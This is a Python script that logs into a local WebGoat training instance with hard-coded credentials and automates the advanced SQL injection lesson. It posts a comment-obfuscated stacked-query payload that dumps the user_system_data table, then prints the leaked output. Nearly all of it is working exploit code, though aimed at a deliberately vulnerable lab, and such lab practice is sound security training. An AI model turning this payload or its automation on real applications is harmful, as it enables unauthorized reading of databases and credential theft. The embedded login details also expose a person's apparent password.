import requests
from requests import session

# Step 1: Import the "requests" module to handle HTTP requests.
# Do NOT use the BeautifulSoup (bs4) library or dict_from_cookiejar from requests.utils library.

# Step 2: Define the base URL and login URL.
base_url = 'http://127.0.0.1:8080/WebGoat/'
login_url = f'{base_url}login'
vulnerable_url = f'{base_url}SqlInjectionAdvanced/attack6a'

# Step 3: Create a session to persist cookies across requests.
session = requests.Session()

# Step 4: Retrieve the login page content.
login_page = session.get(login_url)

# Step 5: Define the user credentials.
credentials = {
    'username': 'sbombatkar',
    'password': 'Sneha#1234'
}

# Step 6: Submit the login details to authenticate. allow_redirects=True MUST be there.
login_response = session.post(login_url, data=credentials, allow_redirects=True)

# Step 7: Check if the login is successful.
if "Invalid username and password" not in login_response.text and login_response.status_code == 200:
    print("Login successful!")
else:
    print("Failed to log in.")
    exit()

# Step 8: Access the lesson page to set up the attack.
lesson_page = session.get(f'{base_url}SqlInjectionAdvanced.lesson.lesson')

# Step 9: Create a payload for the SQL injection attack.
payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"
attack_data = {
    'userid_6a': payload
}

# Step 10: Perform the SQL injection attack.
attack_response = session.post(vulnerable_url, data=attack_data)

# Step 11: Check if the attack was successful by looking for specific keywords in the response.
if "lessonCompleted" in attack_response.text and "true" in attack_response.text:
    # Step 12: Print the feedback and output, indicating the attack was successful.
    response_data = attack_response.json()
    feedback = response_data["feedback"]
    output = response_data["output"]
    
    print(f"Feedback: {feedback}")
    print(f"Output: {output}")
else:
    print("Attack failed.")

# Step 13: Close the session to end the interaction with the server.
session.close()